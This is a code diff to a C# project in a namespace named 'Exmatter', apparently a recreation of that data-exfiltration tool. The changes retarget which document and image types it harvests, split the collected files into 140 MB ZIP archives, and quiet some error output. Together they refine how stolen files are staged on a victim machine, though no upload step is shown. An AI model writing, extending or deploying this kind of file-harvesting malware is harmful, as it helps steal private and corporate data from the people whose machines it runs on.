@@ -16,12 +16,12 @@ namespace Exmatter
             ".ppt",
             ".pptx",
             ".pdf",
-            //".jpg",
+            ".jpg",
             //".jpeg",
-            //".png",
+            ".png",
             //".bmp",
-            ".zip",
-            ".rar",
+            //".zip",
+            //".rar",
             //".mp3",
             //".mp4",
             //".avi",
@@ -42,7 +42,7 @@ namespace Exmatter
             _zipFilePath = zipFilePath;
         }
 
-        public string Go()
+        public List<string> Go()
         {
             var filesToZip = new List<string>();
 
@@ -60,9 +60,9 @@ namespace Exmatter
             }
 
             // Create a ZIP file containing all of the files
-            CreateZipFile(filesToZip);
+            List<string> zipFiles = CreateZipFiles(filesToZip);
 
-            return _zipFilePath;
+            return zipFiles;
             
         }
 
@@ -92,51 +92,67 @@ namespace Exmatter
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[!] Error searching directory {directory}: {ex.Message}");
+                //Console.WriteLine($"[!] Error searching directory {directory}: {ex.Message}");
             }
         }
-        private string GetRandomString()
-        {
-            // Write random named zip to Local\Temp\
-            string tempFolderPath = Path.GetTempPath();
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            var random = new Random();
-            string randomString = new string(Enumerable.Repeat(chars, 8)
-              .Select(s => s[random.Next(s.Length)]).ToArray());
-            string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");
-            
-            return outputFilePath;
-        }
 
-        private void CreateZipFile(List<string> filesToZip)
+        private List<string> CreateZipFiles(List<string> filesToZip)
         {
+            int maxZipFileSize = 140 * 1024 * 1024; // 140 MB in bytes
+            int currentZipFileSize = 0;
+            int zipFileCount = 1;
+            string baseZipFilePath = _zipFilePath.Substring(0, _zipFilePath.LastIndexOf('.'));
+            string zipFilePath = $"{baseZipFilePath}_{zipFileCount}.zip";
+            var zipFilePaths = new List<string>();
+
             try
             {
-                using (var zipArchive = ZipFile.Open(_zipFilePath, ZipArchiveMode.Create))
+                var zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create);
+                
+                foreach (string file in filesToZip)
                 {
-                    foreach (string file in filesToZip)
+                    // Check if the program has permissions to access the file
+                    if (HasFileAccess(file))
                     {
-                        // Check if the program has permissions to access the file
-                        if (HasFileAccess(file))
+                        var fileInfo = new FileInfo(file);
+                        if (currentZipFileSize + fileInfo.Length > maxZipFileSize)
                         {
-                            zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
-                            Console.WriteLine($"[+] Adding file \"{file}\" to ZIP file");
+                            // Current zip file is too big, close it and start a new one
+                            zipArchive.Dispose();
+                            Console.WriteLine($"\n[+] ZIP file created: {zipFilePath}\n");
+                            zipFilePaths.Add(zipFilePath);
+
+                            zipFileCount++;
+                            // Create new zip name
+                            zipFilePath = $"{baseZipFilePath}_{zipFileCount}.zip";
+                            // Start new archive from new name
+                            zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create);
+                            currentZipFileSize = 0;
                         }
-                        else
-                        {
-                            Console.WriteLine($"[!] Program does not have permissions to access file \"{file}\"");
-                        }
+
+                        zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
+                        Console.WriteLine($"[+] Adding file \"{file}\" to ZIP file");
+                        currentZipFileSize += (int)fileInfo.Length;
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[!] Program does not have permissions to access file \"{file}\"");
                     }
                 }
-
-                Console.WriteLine($"[+] ZIP file created: {_zipFilePath}");
-
+                // Release last zip file
+                zipArchive.Dispose();
+                Console.WriteLine($"\n[+] ZIP file created: {zipFilePath}\n");
+                Console.WriteLine($"[+] Total of {zipFileCount} zip files created\n");
+                zipFilePaths.Add(zipFilePath);
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"[!] Error creating ZIP file: {ex.Message}");
             }
+
+            return zipFilePaths;
         }
+
 
 
         private bool HasFileAccess(string filePath)
